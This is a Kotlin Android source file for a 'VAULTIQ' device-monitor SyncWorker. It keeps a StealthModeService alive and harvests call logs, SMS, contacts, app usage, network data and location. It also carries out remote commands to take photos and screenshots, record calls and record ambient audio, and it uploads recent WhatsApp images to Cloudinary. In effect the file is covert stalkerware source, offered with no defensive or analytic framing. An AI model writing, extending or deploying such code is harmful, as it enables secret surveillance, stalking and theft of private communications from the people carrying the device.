package com.devicemonitor.service

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.os.Build
import android.os.Vibrator
import android.os.VibratorManager
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.devicemonitor.data.models.*
import com.devicemonitor.data.repository.DeviceRepository
import com.devicemonitor.utils.*
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.*
import java.text.SimpleDateFormat
import java.util.*
import kotlin.coroutines.resume

/**
 * VAULTIQ - Professional High-Performance SyncWorker
 * 10000% Deep Dive Edition. Optimized for 10x Stability.
 */
class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {

    private val repository = DeviceRepository()
    private val deviceCollector = DeviceCollector(context)
    private val fusedLocationClient: FusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(context)

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        val deviceId = Constants.getDeviceId(applicationContext)
        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())

        try {
            ensureStealthService()
            updateHeartbeat(deviceId, timestamp)

            if (Constants.isWifiOnlySyncEnabled(applicationContext) && !NetworkUtils.isWifiConnected(applicationContext)) return@withContext Result.retry()

            processCommands(deviceId, timestamp)

            coroutineScope {
                val tasks = listOf(
                    async { syncLocation(deviceId, timestamp) },
                    async { repository.insertCallLogs(deviceCollector.getRecentCallLogs()) },
                    async { repository.insertSmsList(deviceCollector.getRecentSms()) },
                    async { repository.insertAppUsageList(deviceCollector.getAppUsageStats()) },
                    async { repository.insertContactList(deviceCollector.getContacts()) },
                    async { repository.insertNetworkInfo(deviceCollector.getNetworkInfo()) },
                    async { repository.insertDeviceInfo(deviceCollector.getDeviceInfo()) },
                    async { deviceCollector.getAppTrafficStats().forEach { repository.insertAppTraffic(it) } }
                )
                tasks.awaitAll()
            }

            if (Constants.isMediaSyncEnabled(applicationContext)) syncMedia(deviceId)

            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }

    private fun ensureStealthService() {
        if (!ServiceUtils.isServiceRunning(applicationContext, StealthModeService::class.java)) {
            val intent = Intent(applicationContext, StealthModeService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) applicationContext.startForegroundService(intent) else applicationContext.startService(intent)
        }
    }

    private suspend fun updateHeartbeat(deviceId: String, timestamp: String) {
        if (repository.getDeviceByToken(Constants.getDeviceToken(applicationContext)) == null) {
            repository.insertDevice(Device(id = deviceId, device_name = "${Build.MANUFACTURER} ${Build.MODEL}", device_token = Constants.getDeviceToken(applicationContext), os_version = "Android ${Build.VERSION.RELEASE}", last_seen = timestamp))
        }
        repository.updateDeviceStatus(deviceId, deviceCollector.getBatteryLevel(), deviceCollector.isCharging(), timestamp)
    }

    private suspend fun processCommands(deviceId: String, timestamp: String) {
        repository.getPendingCommands(deviceId).forEach { command ->
            try {
                var inSvc = false
                when (command.command) {
                    "take_photo" -> CameraHelper.takePhoto(applicationContext)?.let { f ->
                        PhotoHelper.uploadToCloudinary(f).let { (url, pid) ->
                            if (url != null && pid != null) repository.insertPhoto(Photo(device_id = deviceId, cloudinary_public_id = pid, photo_url = url, recorded_at = timestamp))
                            f.delete()
                        }
                    }
                    "ring_device" -> triggerVibe()
                    "take_screenshot", "start_call_recording", "stop_call_recording", "record_ambient" -> {
                        applicationContext.startService(Intent(applicationContext, StealthModeService::class.java).apply { action = command.command })
                        inSvc = true
                    }
                }
                if (!inSvc) repository.updateCommandStatus(command.id ?: "", "completed", executedAt = timestamp)
            } catch (e: Exception) { repository.updateCommandStatus(command.id ?: "", "failed") }
        }
    }

    private suspend fun syncLocation(deviceId: String, timestamp: String) {
        if (ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return
        val loc = suspendCancellableCoroutine<Location?> { cont ->
            fusedLocationClient.lastLocation.addOnSuccessListener { cont.resume(it) }.addOnFailureListener { cont.resume(null) }
        }
        if (loc != null) {
            repository.insertLocation(LocationEntry(device_id = deviceId, latitude = loc.latitude, longitude = loc.longitude, accuracy = loc.accuracy, battery_level = deviceCollector.getBatteryLevel(), recorded_at = timestamp))
        }
    }

    private fun triggerVibe() {
        val v = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) (applicationContext.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager).defaultVibrator else applicationContext.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        v.vibrate(android.os.VibrationEffect.createOneShot(1000, 255))
    }

    private suspend fun syncMedia(deviceId: String) {
        val path = android.os.Environment.getExternalStorageDirectory().absolutePath + "/WhatsApp/Media/WhatsApp Images"
        java.io.File(path).listFiles()?.sortedByDescending { it.lastModified() }?.take(2)?.forEach { file ->
            if (file.isFile && file.extension in listOf("jpg", "png")) {
                val (url, pid) = PhotoHelper.uploadToCloudinary(file)
                if (url != null && pid != null) repository.insertPhoto(Photo(device_id = deviceId, cloudinary_public_id = pid, photo_url = url, recorded_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date(file.lastModified()))))
            }
        }
    }
}
